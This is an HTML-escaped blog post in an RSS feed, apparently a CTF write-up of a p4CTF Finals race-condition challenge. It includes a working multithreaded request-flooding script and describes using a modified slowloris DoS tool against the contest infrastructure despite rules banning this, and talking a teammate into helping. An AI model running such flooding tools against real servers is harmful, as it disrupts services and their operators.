&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;workerFirewall&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;packetStream&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetPacketStream&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatal&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;packetStream err&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;packetStream&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GlobalDB&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Ban&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FromIP&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;(), &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Minute&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;banning suspicious connection = %+v\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;pkt&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;go&lt;/code&gt; before &lt;code&gt;workerFirewall()&lt;/code&gt; essentially means that the function runs asynchronosly, allowing &lt;code&gt;workerHttp()&lt;/code&gt; to be ran alongside &lt;code&gt;workerFirewall()&lt;/code&gt;, which bans our IP address.&lt;/p&gt;
&lt;p&gt;Clearly, we are trying to race the functions in order to send a request where &lt;code&gt;workerFirewall()&lt;/code&gt; takes longer than 5 seconds to respond and ban our IP, so we are able to fetch the flag before we are banned. This is also hinted by in the challenge description.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you be faster enough?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;The naive approach is to simply flood the server with requests on one computer, and use another computer with a seperate IP to request the flag, hoping that the server will lag enough that their IP takes &amp;gt;5 seconds to be banned.&lt;/p&gt;
&lt;p&gt;I coded up a horrendous partially GPT generated python script, with threads to continuesly ping the server to see if this was even viable.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;5&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;not_ddos.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
import requests
import threading
import time


def flood():
    for i in range(10000000):
        resp = requests.get(&amp;#34;http://10.0.14.2:8080/flag&amp;#34;)
        #print(resp.text)
    print(&amp;#34;ended&amp;#34;)

# Number of threads to run
num_threads = 3000

# Create and start the threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=flood, name=f&amp;#34;Thread-{i&amp;#43;1}&amp;#34;)
    thread.start()
    threads.append(thread)
    print(i)

# Wait for all threads to finish
for thread in threads:
    thread.join()

print(&amp;#34;All threads have completed.&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Surprisingly, it actually worked! With a teammate&amp;rsquo;s computer, they requested the &lt;code&gt;/flag&lt;/code&gt; endpoint with their not-yet-banned IP, and got this message:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Validating your request [1/5], please wait üê∏üê∏üê∏
Validating your request [2/5], please wait üê∏üê∏üê∏
Sad üê∏ You are banned üò¢
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We got to &lt;code&gt;2/5&lt;/code&gt;, meaning it lagged the server for around 1 second! Clearly, we just needed a few more requests.&lt;/p&gt;
&lt;p&gt;However, it was at this point when my team started trying to persuade me against DDoS&amp;rsquo;ing the challenge infra, as I took their computers away for more manpower. To be fair, it was in the rules that attacking infra and brute force attacks were not allowed.&lt;/p&gt;

  &lt;img src=&#34;./img/rules.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;So after several failed attemps with thousands of python threads and another teammate&amp;rsquo;s computer, I asked the organisers in person if what I was doing is intended and if it was allowed.&lt;/p&gt;
&lt;p&gt;I was told it wasn&amp;rsquo;t intended (wasn&amp;rsquo;t too surprising) and a maybe for if it was allowed. So I took it as a yes and continued my method.&lt;/p&gt;
&lt;p&gt;Without my teammate&amp;rsquo;s support and resources, I would need to find a way to lag the server using just one computer. What I was doing was essentially DoS&amp;rsquo;ing the infra with my own script - but there are lots of DoS scripts out there already! So why not just steal one from GitHub?&lt;/p&gt;
&lt;p&gt;I came across &lt;a href=&#34;https://github.com/gkbrk/slowloris&#34;&gt;this DoS tool&lt;/a&gt; which looked good, using sockets instead of requests.&lt;/p&gt;

  &lt;img src=&#34;./img/slowloris.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Modifying the code to accept floats as delay values for even faster DoS&amp;rsquo;ing, I convinced my teammate that it was not a DoS script and I was not breaking any rules, quick just &lt;code&gt;curl /flag&lt;/code&gt; endpoint easy flag.&lt;/p&gt;
&lt;p&gt;And it worked.&lt;/p&gt;

  &lt;img src=&#34;./img/ddos_lol.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Here you can see on my teammate &lt;a href=&#34;https://twitter.com/torrytwooo&#34;&gt;torry2&amp;rsquo;s&lt;/a&gt; computer, we successfully lagged the server enough with the DoS tool and blooded the challenge &lt;code&gt;p4{wow-you-are-very-fast-pepega!}&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;./img/pepega_blood.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;h4 id=&#34;intended-solution&#34;&gt;Intended solution&lt;/h4&gt;
&lt;p&gt;After the event, it was revealed that out of the 5 teams that solved the challenge, none of their solutions were intended - everyone went with the request flooding method.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cypis&lt;/code&gt;, the challenge author, later revealed that only 1 packet, not 100000, was required to solve the challenge.&lt;/p&gt;
&lt;p&gt;We can see that &lt;code&gt;workerFirewall()&lt;/code&gt; uses &lt;code&gt;GetPacketInfo()&lt;/code&gt; to obtain our remote IP, so we could make the function hang or return an error to cause our IP to never be returned.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetPacketInfo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PacketInfo&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;layers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UnpackAll&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;packet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IPv4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;.(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ipv4&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Packet&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;not ip packet&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;netPacket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Payload&lt;/span&gt;().(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tcp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Packet&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;not tcp packet&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PacketInfo&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;FromIP&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SrcAddr&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;FromPort&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SrcPort&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ToIP&lt;/span&gt;:     &lt;span style=&#34;color:#a6e22e&#34;&gt;ipInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DstAddr&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;ToPort&lt;/span&gt;:   &lt;span style=&#34;color:#a6e22e&#34;&gt;tcpInfo&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DstPort&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}, &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I did think of this before trying the other method, but I didn&amp;rsquo;t know how to edit packets in Wireshark or &lt;code&gt;tcprelay&lt;/code&gt; some malformed packets to do so.&lt;/p&gt;
&lt;p&gt;cypis posted the solve script on discord, using &lt;code&gt;scapy&lt;/code&gt; to relay the packets in python, which is cool. I think (correct me if I&amp;rsquo;m wrong) the solution causes &lt;code&gt;layers.UnpackAll(data, packet.IPv4)&lt;/code&gt; to hang due to a malformed packet pointing out of bounds somewhere.&lt;/p&gt;

  &lt;img src=&#34;./img/intended.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;Overall I thought it was a fun challenge, and despite the funny unintended solution, the intended solution was quite nice as well!&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;p4CTF Finals was definetely one of the best CTFs I&amp;rsquo;ve been to, not to mention meeting everyone from top teams was really cool! After the event there was an after party, and it was fun talking to the organisers and competitors.&lt;/p&gt;
&lt;p&gt;Again, huge thanks to the &lt;a href=&#34;https://twitter.com/p4_team&#34;&gt;p4CTF team&lt;/a&gt; for hosting the event, and our sponsors who made it possible for us to go! And thanks to my teammates &lt;a href=&#34;https://twitter.com/toasterpwn&#34;&gt;&lt;code&gt;toasterpwn&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/_bradan&#34;&gt;&lt;code&gt;bradan&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://twitter.com/torrytwooo&#34;&gt;&lt;code&gt;torry2&lt;/code&gt;&lt;/a&gt; for playing with me!&lt;/p&gt;
&lt;p&gt;If we qualify next year, I&amp;rsquo;ll definetely be coming to the event again - given that our travel does not take 50 hours again!&lt;/p&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;./img/irl_scoreboard.jpg&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


</content>
    </item>
    
  </channel>
</rss>
